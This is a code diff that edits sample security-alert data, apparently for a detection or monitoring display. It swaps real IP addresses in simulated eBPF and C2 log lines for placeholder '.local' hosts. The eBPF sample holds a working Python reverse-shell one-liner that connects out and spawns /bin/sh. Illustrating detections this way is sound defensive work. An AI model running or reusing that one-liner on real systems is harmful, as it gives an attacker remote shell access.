@@ -72,9 +72,9 @@ int main(int argc, char **argv) {
     ebpf: {
       text: `TIME: 12:04:12 UTC - KERN_INF: eBPF static trace hook hit!
 SYS_ENTER: sys_clone (flags: CLONE_VM | CLONE_FS | CLONE_FILES, child_pid: 41829, p_comm: node)
-SYS_ENTER: sys_execve (filename: "/usr/bin/python3", argv: ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('185.220.101.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh']);"])
+SYS_ENTER: sys_execve (filename: "/usr/bin/python3", argv: ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('payload-relay.tor-exit.local',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh']);"])
 SYS_ENTER: sys_socket (domain: AF_INET, type: SOCK_STREAM) -> fd: 4
-SYS_ENTER: sys_connect (fd: 4, host: "185.220.101.4", remote_port: 443) -> PENDING`,
+SYS_ENTER: sys_connect (fd: 4, host: "payload-relay.tor-exit.local", remote_port: 443) -> PENDING`,
       context: 'Namespace ID: mnt_ns:4026531840 (Containerized Microservice Host pod)'
     },
     binary: {
@@ -88,7 +88,7 @@ SEGMENT IMPORTS: LoadLibraryA, GetProcAddress, VirtualAlloc, VirtualProtect`,
     general: {
       text: `SEC_ALERT_IDS: Drop 45 unauthorized firewall bursts
 PERIMETER: iptables secure rule matching block
-C2_HEURISTIC: Internal client query mapped to known TOR exit block ip list: 104.244.72.115
+C2_HEURISTIC: Internal client query mapped to known TOR exit block: c2-controller.tor-node.local
 AUDITSTAMP: Kernel ring buffer size expanded by system admin (PID: 1012)`,
       context: 'Sensor nodes location: Us-East Core Firewalls edge routing node D3'
     }
